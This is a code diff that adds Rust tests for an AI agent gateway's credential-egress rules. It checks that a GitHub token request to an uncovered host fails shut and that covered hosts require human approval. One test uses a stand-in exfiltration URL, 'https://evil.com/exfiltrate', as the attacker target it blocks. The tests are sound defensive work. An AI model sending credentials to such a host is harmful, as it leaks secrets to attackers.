@@ -102,6 +102,35 @@ fn tempdir() -> std::io::Result<tempfile::TempDir> {
     Ok(temp)
 }
 
+/// The `credential_onboarding.default` shape: a `remote_access` block whose
+/// `targets` is empty (RFC credential-egress-host-authorization — the
+/// reference agents' default).
+fn write_remote_access_empty_targets(agent_dir: &std::path::Path) {
+    let skill = r#"---
+metadata:
+  autonoetic:
+    remote_access:
+      approval_mode: "required"
+      targets: []
+      enabled_languages: []
+      python_imports: []
+      js_imports: []
+      rust_imports: []
+      go_imports: []
+      function_calls: []
+      shell_commands: []
+      package_manager_commands: []
+---
+"#;
+    std::fs::write(agent_dir.join("SKILL.md"), skill).expect("skill should write");
+}
+
+fn tempdir_empty_targets() -> std::io::Result<tempfile::TempDir> {
+    let temp = tempfile::tempdir()?;
+    write_remote_access_empty_targets(temp.path());
+    Ok(temp)
+}
+
 // ---------------------------------------------------------------------------
 // Storage-level tests
 // ---------------------------------------------------------------------------
@@ -431,6 +460,191 @@ fn test_credential_request_denied_host_not_in_allowed_hosts() {
         .unwrap()
         .contains("is not authorized for host 'evil.com'"));
     assert_eq!(parsed["error_type"], "permission");
+}
+
+// ---------------------------------------------------------------------------
+// RFC credential-egress-host-authorization — allowed_hosts routes, never
+// bypasses: a host covered by the credential turns the declaration-layer
+// violation into a host approval; a host covered by nothing fails shut.
+// ---------------------------------------------------------------------------
+
+fn egress_manifest() -> AgentManifest {
+    // The credential_onboarding.default capability shape.
+    test_manifest(vec![
+        Capability::CredentialAccess {
+            services: vec!["github".to_string()],
+        },
+        Capability::NetworkAccess {
+            hosts: vec!["*".to_string()],
+        },
+    ])
+}
+
+fn egress_credential(allowed_hosts: Vec<String>) -> CredentialRecord {
+    CredentialRecord {
+        credential_id: "cred_egress_001".to_string(),
+        service: "github".to_string(),
+        secret_name: "GITHUB_TOKEN".to_string(),
+        inject_as: Some("bearer".to_string()),
+        created_by_agent: None,
+        expires_at: None,
+        shared_with: vec![],
+        allowed_hosts,
+        refresh_token_secret_name: None,
+        refresh_url: None,
+        refresh_method: None,
+        refresh_headers: None,
+        refresh_extract_access_token: None,
+        refresh_extract_refresh_token: None,
+        refresh_extract_expires_in: None,
+        label: None,
+    }
+}
+
+fn run_credential_request(
+    registry: &autonoetic_gateway::runtime::tools::NativeToolRegistry,
+    manifest: &AgentManifest,
+    policy: &PolicyEngine,
+    agent_dir: &std::path::Path,
+    store: &Arc<GatewayStore>,
+    url: &str,
+) -> serde_json::Value {
+    let result = registry
+        .execute(
+            "credential_request",
+            manifest,
+            policy,
+            agent_dir,
+            None,
+            &serde_json::json!({
+                "credential_id": "cred_egress_001",
+                "url": url
+            })
+            .to_string(),
+            Some("egress-test-session"),
+            None,
+            None,
+            Some(store.clone()),
+            None,
+        )
+        .expect("credential_request should execute");
+    serde_json::from_str(&result).expect("valid json")
+}
+
+#[test]
+#[serial_test::serial]
+fn test_credential_request_uncovered_host_fails_shut_without_declaration() {
+    // Empty-targets declaration (the onboarding shape) + a host the
+    // credential does NOT cover: hard error, no gate minted.
+    let manifest = egress_manifest();
+    let policy = PolicyEngine::new(manifest.clone());
+    let registry = default_registry();
+    let temp = tempdir_empty_targets().unwrap();
+    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());
+    store
+        .upsert_credential(&egress_credential(vec!["api.github.com".to_string()]))
+        .unwrap();
+
+    let parsed = run_credential_request(
+        &registry,
+        &manifest,
+        &policy,
+        temp.path(),
+        &store,
+        "https://evil.com/exfiltrate",
+    );
+
+    assert_eq!(parsed["ok"], false);
+    assert!(
+        parsed["error_type"] == "undeclared_remote_target"
+            || parsed["error_type"] == "missing_remote_access_declaration",
+        "expected a fail-shut declaration error, got: {parsed}"
+    );
+    assert!(parsed.get("approval_required").is_none());
+    // And nothing was minted.
+    assert!(store.get_pending_approvals().unwrap().is_empty());
+}
+
+#[test]
+#[serial_test::serial]
+fn test_credential_request_covered_host_mints_host_approval() {
+    // The same empty-targets declaration, but the URL host IS covered by
+    // the credential's allowed_hosts: instead of the fail-shut declaration
+    // error, a host approval is minted (RFC: route, don't bypass).
+    let manifest = egress_manifest();
+    let policy = PolicyEngine::new(manifest.clone());
+    let registry = default_registry();
+    let temp = tempdir_empty_targets().unwrap();
+    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());
+    store
+        .upsert_credential(&egress_credential(vec!["api.github.com".to_string()]))
+        .unwrap();
+
+    let parsed = run_credential_request(
+        &registry,
+        &manifest,
+        &policy,
+        temp.path(),
+        &store,
+        "https://api.github.com/repos/rust-lang/rust",
+    );
+
+    assert_eq!(
+        parsed["ok"], false,
+        "must not silently succeed without an approval: {parsed}"
+    );
+    assert_eq!(parsed["approval_required"], true);
+    assert_eq!(parsed["suspended"], true);
+    let request_id = parsed["request_id"].as_str().expect("request_id");
+    assert!(!request_id.is_empty());
+    // The minted card names the host and the service (not just "credential
+    // request to X"), and the host approval exists in the store.
+    let pending = store.get_pending_approvals().unwrap();
+    let minted = pending
+        .iter()
+        .find(|p| p.request_id == request_id)
+        .expect("approval row should exist");
+    match &minted.action {
+        autonoetic_types::background::ScheduledAction::CredentialRequest {
+            payload, url, ..
+        } => {
+            let host = payload
+                .as_ref()
+                .and_then(|p| p.get("host"))
+                .and_then(|v| v.as_str());
+            assert_eq!(host, Some("api.github.com"));
+            assert!(url.starts_with("https://api.github.com/"));
+        }
+        other => panic!("expected CredentialRequest action, got {other:?}"),
+    }
+}
+
+#[test]
+#[serial_test::serial]
+fn test_credential_request_wildcard_allowed_hosts_covers_any_host() {
+    // allowed_hosts: ["*"] is an explicit operator-granted wildcard: the
+    // declaration gap routes to the approval, which is then the only thing
+    // standing between the secret and the host.
+    let manifest = egress_manifest();
+    let policy = PolicyEngine::new(manifest.clone());
+    let registry = default_registry();
+    let temp = tempdir_empty_targets().unwrap();
+    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());
+    store
+        .upsert_credential(&egress_credential(vec!["*".to_string()]))
+        .unwrap();
+
+    let parsed = run_credential_request(
+        &registry,
+        &manifest,
+        &policy,
+        temp.path(),
+        &store,
+        "https://api.github.com/repos/rust-lang/rust",
+    );
+
+    assert_eq!(parsed["approval_required"], true);
+    assert_eq!(parsed["suspended"], true);
 }
 
 #[test]
